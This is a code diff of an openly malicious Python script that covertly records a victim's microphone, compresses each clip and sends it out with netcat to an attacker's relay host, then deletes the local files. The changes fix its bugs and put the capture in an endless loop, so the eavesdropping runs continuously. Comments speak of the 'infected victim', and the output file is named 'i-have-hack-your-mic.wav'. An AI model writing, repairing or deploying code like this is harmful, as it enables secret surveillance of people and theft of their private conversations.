@@ -11,7 +11,7 @@ def compress_file(filepath,lvl=9):
         data = fin.read()
         fin.close()
     with open(filepath+".gz","wb") as fout:
-        fout.write(gzip.compress(data,level=lvl))
+        fout.write(gzip.compress(data,compresslevel=lvl))
         fout.close()
     return filepath + ".gz" 
 compression = True
@@ -29,13 +29,14 @@ erase_custom_command = "rm -f {file}" # alse u can use this other exemple "wipe 
 
 fs = 44100  # Sample rate
 seconds = 30  # Duration of recording
-IP_HOST, PORT_HOST = "x.x.x.x", 8080 # change this two Vars to set the destination of the outbound connection by the infected victim to your attack relay point. the connection for transmit the audio records use TCP connections.
-myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
-sd.wait()  # Wait until recording is finished
-audio_filepath = '/tmp/i-have-hack-your-mic.wav'
-write(audio_filepath, fs, myrecording)  # Save as WAV file 
-if compression:
-    out_filepath = compress_file(audio_filepath,lvl=compression_level)
-    system(erase_custom_command.format(file=audio_filepath)
-system("netcat "+IP_HOST+" "+PORT_HOST+" < "+out_filepath)
-system(erase_custom_command.format(file=out_filepath)
+while True:
+    IP_HOST, PORT_HOST = "", "" # change this two Vars to set the destination of the outbound connection by the infected victim to your attack relay point. the connection for transmit the audio records use TCP connections.
+    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+    sd.wait()  # Wait until recording is finished
+    audio_filepath = '/tmp/i-have-hack-your-mic.wav'
+    write(audio_filepath, fs, myrecording)  # Save as WAV file 
+    if compression:
+        out_filepath = compress_file(audio_filepath,lvl=compression_level)
+        system(erase_custom_command.format(file=audio_filepath))
+    system("netcat "+IP_HOST+" "+PORT_HOST+" < "+out_filepath)
+    system(erase_custom_command.format(file=out_filepath))
